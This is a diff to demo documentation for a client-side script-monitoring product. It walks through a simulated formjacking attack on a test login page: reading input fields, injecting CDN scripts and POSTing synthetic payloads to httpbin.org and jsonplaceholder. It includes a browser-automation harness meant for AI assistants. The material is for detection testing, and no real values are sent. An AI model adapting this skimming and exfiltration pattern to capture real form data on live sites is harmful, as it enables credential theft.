@@ -6,17 +6,17 @@ sidebar:
   label: Trigger Detection
 ---
 
-import { Aside, Code, Steps } from "@astrojs/starlight/components";
+import { Aside, Code } from "@astrojs/starlight/components";
 import Screenshot from "@f5-sales-demo/docs-theme/components/Screenshot.astro";
 
 export const combinedScript = `// CSD Demo — Combined Detection Script
-// Triggers ALL CSD detection signals: field reads, script injection, exfiltration
+// Exercises field reads, candidate script injection, and synthetic external requests
 (function() {
     console.log('='.repeat(50));
     console.log('[CSD Demo] Combined Detection Script — Starting');
     console.log('='.repeat(50));
 
-    // Phase 1: Harvest all form fields (CSD tracks field reads on page-load DOM fields)
+    // Phase 1: Observe form fields without retaining their values
     console.log('\\n[Formjack] Phase 1: Form field harvesting');
     var inputs = document.querySelectorAll('input');
     var populatedFieldCount = 0;
@@ -79,124 +79,76 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
     console.log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
     console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (4 CDN domains)');
     console.log('[CSD Demo] Exfil channels: 2 (fetch POST)');
-    console.log('[CSD Demo] Detection takes 5-10 minutes to appear in the CSD console.');
+    console.log('[CSD Demo] Detection visibility timing varies by tenant and traffic volume.');
     console.log('='.repeat(50));
 })();`;
 
+export const initScript = [
+    "// Save native references before zone.js patches them",
+    "var si = window.setInterval.bind(window);",
+    "var ci = window.clearInterval.bind(window);",
+    "var nativeFetch = window.fetch.bind(window);",
+    "var log = window.console.log.bind(window.console);",
+    "",
+    "// Poll for login form fields, fill synthetic markers, run detection script",
+    "var poll = si(function() {",
+    "  var emailEl = document.querySelector('input[type=\\\"email\\\"]');",
+    "  var passEl = document.querySelector('input[type=\\\"password\\\"]');",
+    "  if (emailEl && passEl) {",
+    "    ci(poll);",
+    "    var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;",
+    "    nativeSet.call(emailEl, 'test' + '@example.com');",
+    "    emailEl.dispatchEvent(new Event('input', { bubbles: true }));",
+    "    nativeSet.call(passEl, 'DEMO_PASSWORD');",
+    "    passEl.dispatchEvent(new Event('input', { bubbles: true }));",
+    "",
+    combinedScript.replaceAll('console.log', 'log').replaceAll('fetch(', 'nativeFetch('),
+    "  }",
+    "}, 300);",
+].join("\\n");
+
 ## Trigger Detection
 
-CSD monitors JavaScript behavior inside the browser. Unlike WAF or Bot Defense, you cannot trigger CSD detection with curl commands — it requires real browser-side script activity. The following combined script triggers all three CSD detection signals in a single execution: form field harvesting, third-party script injection from multiple CDN domains, and data exfiltration to external endpoints.
+CSD detection requires real browser-side JavaScript activity; cURL alone cannot generate it. The combined script exercises field observation, candidate third-party script loads, and synthetic external requests in one execution.
 
 ### Run the Combined Simulation Script
 
-<Steps>
-1. Navigate to the Juice Shop **login page** at `https://botdemo.sales-demo.f5demos.com/#/login`
+**1. Navigate.** Open `https://client-side-defense.f5-sales-demo.com/#/login`.
 
-2. Enter synthetic markers into the form fields — type `test@example.com` in the **Email** field and `<DEMO_PASSWORD>` in the **Password** field (do not submit the form)
+**2. Add synthetic markers.** Enter `test@example.com` and `DEMO_PASSWORD` without submitting the form.
 
-3. Open DevTools (**F12** &rarr; **Console** tab)
+**3. Open DevTools.** Select the **Console** tab.
 
-   <Screenshot light="/images/devtools-console-light.png" dark="/images/devtools-console-dark.png" alt="Empty DevTools Console ready for script input" />
+<Screenshot light="/images/devtools-console-light.png" dark="/images/devtools-console-dark.png" alt="Empty DevTools Console ready for script input" />
 
-4. Paste the following script into the console and press **Enter** — it runs automatically as a self-executing function
+**4. Run the script.** Paste the script below into the console and press **Enter**.
 
-   <Code code={combinedScript} lang="js" title="Combined Detection Script" />
+<Code code={combinedScript} lang="js" title="Combined Detection Script" />
 
-5. Observe the phased `[CSD Demo]` console output confirming each step: field harvesting, script injection from 4 CDN domains, and data exfiltration. `esm.sh` serves ES module syntax (`export default …`) — when loaded as a classic `<script>` tag this causes `Uncaught SyntaxError: Cannot use import statement outside a module`. This is expected and does not affect CSD detection (the script tag is still injected and the network request is still made)
+**5. Record evidence.** Confirm the harness attempted field observation, four candidate CDN loads, and two synthetic external requests. Use the Network tab to record which requests occurred. A CDN content error does not prove or disprove CSD detection.
 
-   <Screenshot light="/images/devtools-console-output-light.png" dark="/images/devtools-console-output-dark.png" alt="Console output after running the simulation script" />
-</Steps>
+<Screenshot light="/images/devtools-console-output-light.png" dark="/images/devtools-console-output-dark.png" alt="Console output after running the simulation script" />
 
 ### AI-Automated Execution
 
 AI assistants with browser automation tools (MCP Chrome DevTools, Playwright, Puppeteer) execute the simulation programmatically instead of following the manual steps above:
 
-1. **Navigate with initScript** — first navigate to `about:blank` to ensure a clean document context, then `navigate_page` to the login page URL (e.g., `http://$F5XC_DOMAINNAME/#/login`) with an `initScript` that saves native `setInterval`, `clearInterval`, `fetch`, and `console.log` before zone.js patches them, polls for the login form fields, fills credentials via the native `HTMLInputElement.prototype.value` setter, and immediately executes the Combined Detection Script inline. Use the verbatim initScript below.
-2. **Dismiss Welcome Banner** — `press_key` with `Escape` to close the Welcome Banner. On subsequent visits the banner may not appear (cookies persisted)
-3. **Wait for completion** — wait 10 seconds for all CDN script load/error callbacks and fetch promise resolutions to complete
-4. **Capture evidence** — `list_console_messages` to check for `[CSD Demo] Simulation complete`; `list_network_requests` filtered to `script` and `fetch` types to verify HTTP status codes
+1. **Navigate with initScript** — first navigate to `about:blank` to ensure a clean document context, then `navigate_page` to `https://$XCSH_DOMAINNAME/#/login` with an `initScript` that saves native browser functions before application instrumentation modifies them, polls for the login fields, fills synthetic markers, and executes the simulation inline.
+2. **Dismiss Welcome Banner** — `press_key` with `Escape` if the banner appears.
+3. **Wait for completion** — allow the attempted requests to settle; ten seconds is a common lab observation, not a product guarantee.
+4. **Capture evidence** — use console messages to confirm the harness completed and Network requests to establish which browser requests were made and their results.
 
-**initScript harness (verbatim — wraps the Combined Detection Script for automated execution):**
+#### initScript Harness
 
-```javascript
-// Save native references before zone.js patches them
-var _si = window.setInterval.bind(window);
-var _ci = window.clearInterval.bind(window);
-var _fetch = window.fetch.bind(window);
-var _log = window.console.log.bind(window.console);
+The following harness wraps the Combined Detection Script for automated execution:
 
-// Poll for login form fields, fill credentials, run detection script
-var _poll = _si(function() {
-  var emailEl = document.querySelector('input[type="email"]');
-  var passEl  = document.querySelector('input[type="password"]');
-  if (emailEl && passEl) {
-    _ci(_poll);
-    // Fill credentials via native setter (bypasses zone.js)
-    var nativeSet = Object.getOwnPropertyDescriptor(
-      window.HTMLInputElement.prototype, 'value').set;
-    nativeSet.call(emailEl, 'test@example.com');
-    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
-    nativeSet.call(passEl, '<DEMO_PASSWORD>');
-    passEl.dispatchEvent(new Event('input', { bubbles: true }));
+<Code code={initScript} lang="js" title="initScript Harness" />
 
-    // Run Combined Detection Script inline using native fetch for exfil
-    (function() {
-      _log('==================================================');
-      _log('[CSD Demo] Combined Detection Script — Starting');
-      _log('==================================================');
-
-      _log('\n[Formjack] Phase 1: Form field harvesting');
-      var inputs = document.querySelectorAll('input');
-      var populatedFieldCount = 0;
-      inputs.forEach(function(input) {
-        if (input.value) populatedFieldCount++;
-      });
-      _log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
-
-      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
-      var cdns = [
-        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
-        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
-        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
-        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
-      ];
-      cdns.forEach(function(cdn) {
-        var script = document.createElement('script');
-        script.src = cdn.url;
-        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
-        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
-        document.head.appendChild(script);
-        _log('[Supply Chain] Injected script tag: ' + cdn.name);
-      });
-
-      _log('\n[Exfil] Phase 3: Data exfiltration');
-      var payload = JSON.stringify({
-        type: 'combined_demo', field_count: inputs.length,
-        populated_field_count: populatedFieldCount,
-        field_values_discarded: true, timestamp: Date.now()
-      });
-      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
-        .then(function() { _log('[Exfil] Synthetic signal sent to www.httpbin.org'); });
-      _fetch('https://jsonplaceholder.typicode.com/posts', {
-        method: 'POST', mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' }, body: payload
-      }).then(function() { _log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com'); });
-
-      _log('\n==================================================');
-      _log('[CSD Demo] Simulation complete');
-      _log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
-      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
-      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
-      _log('==================================================');
-    })();
-  }
-}, 300);
-```
-
-**Note on native `fetch`:** This harness saves `window.fetch.bind(window)` to avoid zone.js errors. This is the correct behavior for all attack simulation phases. CSD mitigation blocks script loading (by clearing `&lt;script&gt;` tag `src` values), not `fetch()` calls, so saving the native fetch reference does not affect mitigation behavior. The same initScript is used for Phase 2 and Phase 3.
+**Note on saved native functions:** The harness preserves browser functions before application instrumentation modifies them. This keeps the lab runner reliable; it is not evidence of, or a claim about, the internal CSD enforcement mechanism.
 
 <Aside type="caution">
-**zone.js incompatibility** — Juice Shop uses Angular's zone.js, which patches `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest`, and other browser APIs. This breaks the MCP `evaluate_script`, `fill`, and `click` tools with `Cannot read properties of undefined (reading 'call')`. Use `navigate_page` with `initScript` instead — `initScript` runs before zone.js loads, so you can save native API references. The initScript must fill form fields using the native `HTMLInputElement.prototype.value` setter (not the `fill` tool) and run the detection script inline within the `setInterval` callback.
+**zone.js incompatibility** — Juice Shop uses zone.js, which can disrupt browser-automation calls after page load.
+Use `navigate_page` with `initScript` to preserve browser functions before application instrumentation runs. Fill fields through the native value setter and run the simulation inside the polling callback.
 </Aside>
 
 <Aside type="note">
@@ -206,23 +158,24 @@ var _poll = _si(function() {
 Operators without browser automation tools use the manual steps above.
 
 <Aside type="tip">
-Detection takes **5-10 minutes** to appear on the CSD dashboard. If alerts are not yet visible after running the script, continue with the [CSD Console walkthrough](/csd/en/csd-console/) and check back.
+Detection visibility timing varies by tenant, traffic volume, and backend processing. Poll the documented APIs and treat DET-3 as the Phase 3 entry gate rather than relying on a fixed delay.
 </Aside>
 
 ### What the Script Does
 
-The combined simulation triggers all three CSD detection signals:
+The combined simulation exercises three observable behaviors:
 
-| Behavior | What the Script Does | What CSD Sees |
+| Behavior | What the Script Does | Evidence to Record |
 | --- | --- | --- |
-| **Field harvesting** | Reads values from existing `input` elements (email, password) | Scripts reading sensitive form fields — flagged High Risk |
-| **Script injection** | Appends 4 `<script>` tags loading from `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, and `ga.jspm.io` | 4 new third-party script domains on the page |
-| **Synthetic network signals** | Sends field counts and explicit discard markers via `fetch`; field values never enter the payload | Network calls to external domains (note: fetch destinations appear as script network interactions, not in the Network domain view) |
+| **Field observation** | Reads existing `input` elements without retaining their values | Console field count plus any later `/formFields` entries |
+| **Script injection** | Attempts 4 `&lt;script&gt;` loads from candidate CDN domains | The subset of requests observed in the browser Network log and later domain/script telemetry |
+| **Synthetic network signals** | Sends field counts and discard markers via `fetch`; field values never enter the payload | Browser fetch requests plus any matching `/detected_domains` entries |
 
 <Aside type="note">
-CSD has specific detection boundaries — for example, only page-load DOM fields are tracked and the Network view shows script-load domains only. See [Detection Boundaries](/csd/en/overview/#detection-boundaries) for the full list.
+Observed coverage and API field population vary by run. Do not claim all four CDN candidates were detected unless they appear in this run's evidence.
 </Aside>
 
 ### Advanced Simulations
 
-The combined script above is a simplified 3-phase version (harvest, inject, exfiltrate) suitable for most demos. The [Attack Script Library](/csd/en/attack-scripts/) provides 10 targeted scripts organized by attack type, including a **Maximum Detection** stress test that adds DOM manipulation, cookie exfiltration, and image beacon channels on top of the combined script's coverage. Use the individual scripts to demonstrate specific attack categories (formjacking, digital skimming, supply chain injection, data exfiltration, DOM manipulation) in isolation.
+The combined script is a simplified harvest, inject, and synthetic-request scenario for demonstrations.
+The [Attack Script Library](/csd/en/attack-scripts/) contains targeted scenarios for focused validation. Use each scenario only for the behavior and evidence it explicitly exercises.
